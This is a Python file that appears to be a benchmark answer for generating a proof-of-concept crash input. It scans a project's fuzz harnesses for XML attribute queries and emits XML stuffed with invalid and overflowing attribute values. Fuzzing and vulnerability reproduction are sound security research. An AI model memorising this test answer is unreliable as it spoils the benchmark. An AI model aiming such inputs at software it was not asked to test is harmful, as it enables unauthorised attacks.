import os
import tarfile
import tempfile
import re


class Solution:
    def solve(self, src_path: str) -> bytes:
        tmpdir = None
        try:
            tmpdir = tempfile.mkdtemp(prefix="pocgen_")

            with tarfile.open(src_path, 'r:*') as tar:

                def is_within_directory(directory, target):
                    abs_directory = os.path.abspath(directory)
                    abs_target = os.path.abspath(target)
                    prefix = os.path.commonprefix([abs_directory, abs_target])
                    return prefix == abs_directory

                def safe_extract(tar_obj, path=".", members=None, numeric_owner=False):
                    if members is None:
                        members = tar_obj.getmembers()
                    safe_members = []
                    for member in members:
                        member_path = os.path.join(path, member.name)
                        if is_within_directory(path, member_path):
                            safe_members.append(member)
                    tar_obj.extractall(path, safe_members, numeric_owner=numeric_owner)

                safe_extract(tar, tmpdir)
        except Exception:
            tmpdir = None

        harness_files = []
        if tmpdir is not None:
            for root, dirs, files in os.walk(tmpdir):
                for name in files:
                    lower = name.lower()
                    if not (lower.endswith(".c") or lower.endswith(".cc") or lower.endswith(".cpp")
                            or lower.endswith(".cxx") or lower.endswith(".c++") or lower.endswith(".cp")):
                        continue
                    path = os.path.join(root, name)
                    try:
                        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                            txt = f.read()
                        if 'LLVMFuzzerTestOneInput' in txt:
                            harness_files.append((path, txt))
                    except Exception:
                        continue

        attr_info = {}
        element_names = set()

        if harness_files:
            for path, txt in harness_files:
                for m in re.finditer(r'Query(Int|Unsigned|Unsigned64|Int64|Bool|Double|Float)Attribute\("([^"]+)"', txt):
                    tp = m.group(1)
                    name = m.group(2)
                    attr_info.setdefault(name, set()).add(tp)
                for m in re.finditer(r'FirstChildElement\("([^"]+)"\)', txt):
                    element_names.add(m.group(1))
                for m in re.finditer(r'NewElement\("([^"]+)"\)', txt):
                    element_names.add(m.group(1))

        # Limit number of attributes to avoid overly large PoC
        if len(attr_info) > 16:
            limited = {}
            for k in attr_info:
                limited[k] = attr_info[k]
                if len(limited) >= 16:
                    break
            attr_info = limited

        # Default attributes if none discovered from harness
        if not attr_info:
            attr_info = {
                'intAttr': {'Int'},
                'uintAttr': {'Unsigned'},
                'boolAttr': {'Bool'},
                'doubleAttr': {'Double'},
                'floatAttr': {'Float'}
            }

        # Choose root element name
        root_name = "root"
        if element_names:
            sorted_elems = sorted(element_names, key=lambda s: (len(s), s))
            root_name = sorted_elems[0]

        def sanitize_xml_name(name: str, prefix: str) -> str:
            sanitized = re.sub(r'[^A-Za-z0-9_.:-]', '_', name)
            if not sanitized:
                sanitized = prefix
            if not re.match(r'[A-Za-z_:]', sanitized[0]):
                sanitized = prefix + sanitized
            return sanitized

        def value_for_types(types):
            if 'Bool' in types:
                return "maybe"
            if any(t in types for t in ('Int', 'Unsigned', 'Int64', 'Unsigned64')):
                return "xyzxyzxyz"
            if any(t in types for t in ('Double', 'Float')):
                return "not_a_number"
            return "invalid"

        # Build XML string
        lines = []
        lines.append('<?xml version="1.0" encoding="UTF-8"?>')

        attr_items = list(attr_info.items())

        root_attrs_parts = []
        for name, types in attr_items:
            aname = sanitize_xml_name(name, "a")
            aval = value_for_types(types)
            root_attrs_parts.append(f'{aname}="{aval}"')

        if root_attrs_parts:
            root_attrs = " " + " ".join(root_attrs_parts)
        else:
            root_attrs = ""

        root_tag = sanitize_xml_name(root_name, "r")
        lines.append(f'<{root_tag}{root_attrs}>')

        num_children = 20
        for i in range(num_children):
            child_name = f'child{i}'
            child_attr_parts = []
            for name, types in attr_items:
                aname = sanitize_xml_name(name, "c")
                if 'Bool' in types:
                    aval = "yesno" if i % 2 else "TRUEish"
                elif any(t in types for t in ('Int', 'Unsigned', 'Int64', 'Unsigned64')):
                    if i % 4 == 0:
                        aval = "99999999999999999999999999999999999999999"
                    elif i % 4 == 1:
                        aval = "+-12345"
                    elif i % 4 == 2:
                        aval = "0xGHIJK"
                    else:
                        aval = "   "
                elif any(t in types for t in ('Double', 'Float')):
                    if i % 3 == 0:
                        aval = "1e9999"
                    elif i % 3 == 1:
                        aval = "NaN(Invalid)"
                    else:
                        aval = "INFINF"
                else:
                    aval = "???"
                child_attr_parts.append(f'{aname}="{aval}"')
            attrs_str = ""
            if child_attr_parts:
                attrs_str = " " + " ".join(child_attr_parts)
            lines.append(f'  <{sanitize_xml_name(child_name, "c")}{attrs_str} />')

        lines.append(f'</{root_tag}>')

        xml_str = "\n".join(lines)

        target_min_len = 1500
        if len(xml_str) < target_min_len:
            pad_len = target_min_len - len(xml_str)
            comment = "<!--" + ("X" * pad_len) + "-->"
            xml_str = xml_str + "\n" + comment

        return xml_str.encode('utf-8')
